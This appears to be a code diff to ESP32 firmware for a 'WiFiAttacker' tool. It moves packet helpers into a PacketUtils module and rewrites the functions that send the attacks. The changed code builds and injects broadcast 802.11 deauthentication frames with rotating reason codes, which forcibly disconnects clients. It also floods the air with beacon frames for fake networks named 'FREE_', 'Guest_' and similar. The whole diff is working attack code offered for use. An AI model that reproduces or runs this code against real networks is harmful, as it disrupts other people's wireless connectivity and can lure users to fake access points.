@@ -1,4 +1,6 @@
 #include "WiFiAttacker/WiFiAttacker.h"
+#include "WiFiAttacker/utils/PacketUtils.h"
+#include "WiFiAttacker/network/NetworkManager.h"
 
 // Static instance for callback
 WiFiAttacker* WiFiAttacker::instance = nullptr;
@@ -19,28 +21,15 @@ WiFiAttacker::WiFiAttacker()
 void WiFiAttacker::initializePacketTemplates() {
     // Deauth packet template
     uint8_t deauthTemplate[26] = {
-        0xC0, 0x00,                         // Type/Subtype: Deauthentication
-        0x00, 0x00,                         // Duration
+        0xC0, 0x00,                         // Frame Control Field (Type=Management, Subtype=Deauth)
+        0x3A, 0x01,                         // Duration
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
         0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (AP)
         0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP MAC)
-        0x00, 0x00,                         // Sequence/Fragment number
-        0x07, 0x00                          // Reason code
+        0x00, 0x00,                         // Sequence Control
+        0x02, 0x00                          // Reason code (2 = Previous authentication no longer valid)
     };
     memcpy(deauthPacket, deauthTemplate, sizeof(deauthTemplate));
-
-    // Beacon packet template
-    uint8_t beaconTemplate[109] = {
-        0x80, 0x00, 0x00, 0x00,             // Type/Subtype
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
-        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC
-        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
-        0x64, 0x00,                         // Beacon interval
-        0x31, 0x04,                         // Capability info
-        0x00, 0x00                          // SSID parameter
-    };
-    memcpy(beaconPacket, beaconTemplate, sizeof(beaconTemplate));
 }
 
 void WiFiAttacker::setup() {
@@ -174,7 +163,6 @@ const char* WiFiAttacker::getEncryptionType(wifi_auth_mode_t encryptionType) {
         case WIFI_AUTH_WPA2_PSK: return "WPA2";
         case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
         case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
-        case WIFI_AUTH_WPA3_PSK: return "WPA3";
         default: return "Unknown";
     }
 }
@@ -258,12 +246,28 @@ void WiFiAttacker::startDeauthAttack() {
 }
 
 void WiFiAttacker::sendDeauthPacket() {
-    memset(&deauthPacket[4], 0xFF, 6); // Destination: broadcast
+    // Ensure we're in the right channel
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
     
-    updateSequence(deauthPacket);
-    rotateReasonCode();
-    deauthPacket[24] = reasonCodes[reasonIndex];
+    // Set up promiscuous filter for management frames
+    wifi_promiscuous_filter_t filter;
+    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+    esp_wifi_set_promiscuous_filter(&filter);
     
+    // Configure for sending management frames
+    esp_wifi_set_promiscuous(true);
+    
+    // Update destination (broadcast)
+    memset(&deauthPacket[4], 0xFF, 6);
+    
+    // Update sequence number
+    PacketUtils::updateSequence(deauthPacket, sequenceNum);
+    
+    // Rotate reason code
+    PacketUtils::rotateReasonCode(reasonIndex);
+    deauthPacket[24] = PacketUtils::reasonCodes[reasonIndex];
+    
+    // Send frame
     esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
     
     if (result == ESP_OK) {
@@ -272,6 +276,8 @@ void WiFiAttacker::sendDeauthPacket() {
     } else {
         Serial.print("X");
     }
+    
+    delay(1); // Small delay between packets
 }
 
 void WiFiAttacker::startTargetedDeauth() {
@@ -331,32 +337,28 @@ void WiFiAttacker::startBeaconSpam() {
 
 void WiFiAttacker::sendBeaconSpam() {
     // Generate random SSID
-    char fakeSSID[MAX_SSID_LENGTH + 1];
+    char fakeSSID[PacketUtils::MAX_SSID_LENGTH + 1];
     const char* prefixes[] = {"FREE_", "WiFi_", "Guest_", "Public_", "Open_", "Net_"};
-    snprintf(fakeSSID, MAX_SSID_LENGTH, "%s%04X", prefixes[random(6)], random(0x10000));
+    snprintf(fakeSSID, PacketUtils::MAX_SSID_LENGTH, "%s%04X", prefixes[random(6)], random(0x10000));
     
-    // Random MAC
-    for (int i = 10; i < 16; i++) {
-        beaconPacket[i] = random(256);
-    }
-    beaconPacket[10] &= 0xFE; // Ensure unicast
+    uint8_t packet[PacketUtils::MAX_PACKET_SIZE];
+    uint16_t packetSize = PacketUtils::createBeaconFrame(packet, fakeSSID, currentChannel);
     
-    uint8_t packet[MAX_PACKET_SIZE];
-    memcpy(packet, beaconPacket, 37);
+    PacketUtils::updateSequence(packet, sequenceNum);
     
-    int ssidLen = strlen(fakeSSID);
-    packet[37] = ssidLen;
-    memcpy(&packet[38], fakeSSID, ssidLen);
-    
-    int packetSize = 38 + ssidLen;
-    
-    updateSequence(packet);
+    // Make sure we're in the right mode and channel
+    wifi_promiscuous_filter_t filter;
+    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
     
     esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false);
     
     if (result == ESP_OK) {
         packetsSent++;
         Serial.print("+");
+    } else {
+        Serial.print("X");
     }
 }
 
